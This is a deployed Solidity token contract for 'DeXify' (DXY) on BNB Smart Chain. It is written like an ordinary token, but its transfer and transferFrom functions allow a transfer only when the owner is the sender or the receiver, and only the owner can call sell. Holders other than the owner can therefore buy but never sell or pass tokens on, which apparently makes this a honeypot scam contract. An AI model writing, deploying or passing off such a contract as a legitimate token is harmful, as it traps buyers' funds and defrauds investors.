/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

// SPDX-License-Identifier: MIT
// File: DeXify.sol



pragma solidity ^0.8.0;

contract DeXify {
    string public name = "DeXify";
    string public symbol = "DXY";
    uint256 public totalSupply = 1000000 * 10 ** 18;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    address public owner;
    bool public isSellEnabled = false;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event SellEnabled(address indexed owner, bool indexed enabled);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }
    
    modifier canSell() {
        require(isSellEnabled == true, "Selling is currently disabled.");
        require(msg.sender == owner, "Only owner can sell tokens.");
        _;
    }

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function enableSell(bool _isSellEnabled) public onlyOwner {
        isSellEnabled = _isSellEnabled;
        emit SellEnabled(owner, _isSellEnabled);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance.");
        require(msg.sender == owner || _to == owner, "Only owner can transfer tokens.");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0), "Invalid address.");
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient balance.");
        require(allowance[_from][msg.sender] >= _value, "Insufficient allowance.");
        require(_from == owner || _to == owner, "Only owner can transfer tokens.");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function sell(uint256 _value) public canSell {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance.");
        balanceOf[msg.sender] -= _value;
        balanceOf[address(0)] += _value;
        emit Transfer(msg.sender, address(0), _value);
    }
}